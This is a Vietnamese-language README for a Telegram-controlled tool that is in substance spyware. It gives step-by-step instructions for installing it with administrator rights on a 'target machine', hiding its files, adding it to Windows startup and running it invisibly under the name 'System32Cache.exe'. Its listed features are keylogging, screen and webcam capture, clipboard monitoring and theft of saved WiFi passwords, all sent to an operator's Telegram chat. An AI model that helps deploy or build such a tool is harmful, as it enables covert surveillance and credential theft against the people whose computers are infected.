# 🖥️ Remote Control Application

Ứng dụng điều khiển từ xa qua Telegram - Tự động quay màn hình, ghi phím, và gửi dữ liệu.

## 🚀 Cài đặt nhanh

### ⭐ Phương pháp 1: Sử dụng file .EXE (KHUYẾN NGHỊ - Không cần Python!)

**⚠️ QUAN TRỌNG:** File `.exe` đã chứa TẤT CẢ thư viện bên trong, máy đích **KHÔNG CẦN** Python hay bất kỳ thư viện nào!

1. **Tải file `INSTALL_EXE.bat`** từ GitHub:
   - Vào: https://github.com/truongxoantit/TLe1
   - Click vào file `INSTALL_EXE.bat`
   - Click nút **"Raw"** (góc phải trên)
   - Click chuột phải → **"Save as"** → Lưu với tên `INSTALL_EXE.bat`

2. **Chạy file `INSTALL_EXE.bat`** (Click đúp hoặc chuột phải → Run as Administrator)

**XONG!** Ứng dụng sẽ tự động:
- ✅ Tải file .exe từ GitHub (đã chứa tất cả thư viện)
- ✅ Chạy ngay lập tức (KHÔNG cần cài Python hay thư viện!)
- ✅ Ẩn thư mục và file
- ✅ Thêm vào Windows Startup
- ✅ Chạy hoàn toàn ẩn với vòng lặp vô hạn

**Lưu ý:** File .exe cần được build trước (xem [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md))

### Phương pháp 2: Sử dụng Python (Cần Python trên máy đích)

1. **Tải file `INSTALL.bat`** từ GitHub:
   - Vào: https://github.com/truongxoantit/TLe1
   - Click vào file `INSTALL.bat`
   - Click nút **"Raw"** (góc phải trên)
   - Click chuột phải → **"Save as"** → Lưu với tên `INSTALL.bat`

2. **Chạy file `INSTALL.bat`** (Click đúp hoặc chuột phải → Run as Administrator)

**XONG!** Ứng dụng sẽ tự động:
- ✅ Tải tất cả file từ GitHub Private Repo
- ✅ Cài đặt thư viện Python
- ✅ Ẩn thư mục và file
- ✅ Thêm vào Windows Startup
- ✅ Khởi động ứng dụng ngay
- ✅ Chạy hoàn toàn ẩn

## 📋 Tính năng

- 🎥 **Quay màn hình**: Tự động quay 10-20 giây
- ⌨️ **Keylogger**: Ghi lại tất cả phím bấm
- 📸 **Screenshot**: Chụp ảnh màn hình định kỳ
- 📋 **Clipboard**: Theo dõi clipboard
- 📁 **File Transfer**: Gửi/nhận file qua Telegram
- 🎮 **Remote Control**: Điều khiển từ xa qua Telegram
- 🖥️ **System Info**: Thu thập thông tin hệ thống
- 📶 **WiFi Extractor**: Lấy mật khẩu WiFi đã lưu (mỗi 1 giờ)
- 📹 **Webcam Capture**: Chụp ảnh từ webcam định kỳ (mỗi 30 phút)
- 🔌 **USB Monitor**: Theo dõi thiết bị USB mới (mỗi 1 phút)
- 🔒 **Stealth Mode**: Chạy hoàn toàn ẩn

## ⚙️ Cấu hình

Sửa file `config.py`:
- `TELEGRAM_BOT_TOKEN`: Token bot Telegram
- `TELEGRAM_CHAT_ID`: ID chat để nhận dữ liệu

## 🛑 Dừng ứng dụng

Nhấn: **Ctrl + Shift + Alt + P**

## 📁 Cấu trúc file

```
main/
├── INSTALL_EXE.bat          ← File cài đặt .EXE (KHUYẾN NGHỊ!)
├── INSTALL.bat              ← File cài đặt Python
├── BUILD_EXE.bat            ← Build file .exe từ Python
├── System32Cache.exe        ← File .exe (sau khi build)
├── main_stealth.py          ← File chính Python
├── config.py                ← Cấu hình
├── requirements.txt         ← Thư viện Python
└── ... (các module khác)
```

## ⚠️ Lưu ý

### Phương pháp 1 (File .EXE):
- ✅ **KHÔNG CẦN** Python trên máy đích
- ✅ **KHÔNG CẦN** cài thư viện gì cả
- ✅ Chỉ cần file .exe (đã chứa tất cả)

### Phương pháp 2 (Python):
- ⚠️ Cần Python trên máy đích
- ⚠️ Cần cài thư viện (tự động qua INSTALL.bat)

### Chung:
- Ứng dụng tự động chạy khi khởi động Windows
- Chạy hoàn toàn ẩn, không có cửa sổ
- Repo GitHub: **TLe1** (Private)

## 📦 Build file .EXE

Xem hướng dẫn chi tiết: [HUONG_DAN_BUILD_EXE.md](HUONG_DAN_BUILD_EXE.md)

**Tóm tắt:**
- Build trên máy phát triển (cần Python): `BUILD_EXE.bat`
- Upload file .exe lên GitHub
- Máy đích chỉ cần chạy `INSTALL_EXE.bat` (KHÔNG cần Python!)

## 🔧 Kiểm tra và Debug

### Test kết nối Telegram:
```bash
python TEST_TELEGRAM.py
```

### Kiểm tra trạng thái ứng dụng:
```bash
CHECK_STATUS.bat
```

### Xem log lỗi:
- `%APPDATA%\Microsoft\Windows\System32Cache\temp\error.log`
- `%APPDATA%\Microsoft\Windows\System32Cache\temp\telegram_error.log`

## 📖 Hướng dẫn chi tiết

1. **Tạo Bot Telegram:**
   - Tìm @BotFather trên Telegram
   - Gửi `/newbot` và làm theo hướng dẫn
   - Lưu lại Bot Token

2. **Lấy Chat ID:**
   - Tìm @userinfobot trên Telegram
   - Gửi `/start` để lấy Chat ID

3. **Cấu hình:**
   - Sửa file `config.py`
   - Điền `TELEGRAM_BOT_TOKEN` và `TELEGRAM_CHAT_ID`

4. **Upload lên GitHub:**
   - Tạo repo mới trên GitHub
   - Upload tất cả file (trừ `config.py` - đã có trong `.gitignore`)
   - Cập nhật `INSTALL.bat` với GitHub token và repo name

5. **Cài đặt trên máy đích:**
   - Tải `INSTALL.bat` từ GitHub
   - Chạy với quyền Administrator
   - Ứng dụng sẽ tự động cài đặt và chạy
